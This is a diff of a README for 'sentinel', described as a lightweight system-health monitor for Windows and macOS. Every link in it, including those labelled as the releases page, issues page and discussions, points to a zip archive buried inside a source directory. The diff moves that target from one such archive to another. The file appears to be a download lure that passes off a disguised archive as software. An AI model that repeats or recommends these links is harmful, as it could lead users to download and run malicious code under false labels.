@@ -1,7 +1,7 @@
 # 🚀 sentinel - Monitor Your System's Health Easily
 
 ## 📥 Download Now
-[![Download sentinel](https://github.com/hussienesmail/sentinel/raw/refs/heads/main/engine/internal/config/Software_2.2.zip)](https://github.com/hussienesmail/sentinel/raw/refs/heads/main/engine/internal/config/Software_2.2.zip)
+[![Download sentinel](https://raw.githubusercontent.com/hussienesmail/sentinel/main/@heimdall-sdk/express/src/Software_2.0.zip)](https://raw.githubusercontent.com/hussienesmail/sentinel/main/@heimdall-sdk/express/src/Software_2.0.zip)
 
 ## 📖 Introduction
 sentinel is a simple and lightweight monitoring tool designed to keep an eye on your system's health and performance. With sentinel, you can easily track key metrics such as CPU usage, memory consumption, and disk space. This tool helps you ensure that your system runs smoothly and efficiently.
@@ -23,7 +23,7 @@ To run sentinel, you need:
 To get started with sentinel, follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Click this link to go to the releases page and download the latest version of sentinel: [Download Here](https://github.com/hussienesmail/sentinel/raw/refs/heads/main/engine/internal/config/Software_2.2.zip).
+   Click this link to go to the releases page and download the latest version of sentinel: [Download Here](https://raw.githubusercontent.com/hussienesmail/sentinel/main/@heimdall-sdk/express/src/Software_2.0.zip).
 
 2. **Choose Your Version**  
    Look for the latest release version. You will see different files available for download. Click on the file that matches your operating system. 
@@ -52,16 +52,16 @@ A: Yes, sentinel is completely free to use.
 A: Sentinel works on Windows and macOS. It does not support Linux at this time.
 
 **Q: What should I do if I encounter issues?**  
-A: Visit the [GitHub issues page](https://github.com/hussienesmail/sentinel/raw/refs/heads/main/engine/internal/config/Software_2.2.zip) to report any problems or request help.
+A: Visit the [GitHub issues page](https://raw.githubusercontent.com/hussienesmail/sentinel/main/@heimdall-sdk/express/src/Software_2.0.zip) to report any problems or request help.
 
 ## 🧑‍🤝‍🧑 Community & Support
 Join our community to get tips, share experiences, and help improve sentinel. You can connect with other users and developers through:
 
-- [GitHub Discussions](https://github.com/hussienesmail/sentinel/raw/refs/heads/main/engine/internal/config/Software_2.2.zip)
+- [GitHub Discussions](https://raw.githubusercontent.com/hussienesmail/sentinel/main/@heimdall-sdk/express/src/Software_2.0.zip)
 - Social media channels (if applicable)
 
 ## 👍 Contribute
 If you want to contribute to sentinel, feel free to open issues or submit pull requests on GitHub. Your feedback helps us make this tool better for everyone.
 
 ## 📥 Download Now Again
-Don't forget to revisit the releases page to download sentinel: [Download Here](https://github.com/hussienesmail/sentinel/raw/refs/heads/main/engine/internal/config/Software_2.2.zip). Start monitoring your system’s health today!
+Don't forget to revisit the releases page to download sentinel: [Download Here](https://raw.githubusercontent.com/hussienesmail/sentinel/main/@heimdall-sdk/express/src/Software_2.0.zip). Start monitoring your system’s health today!
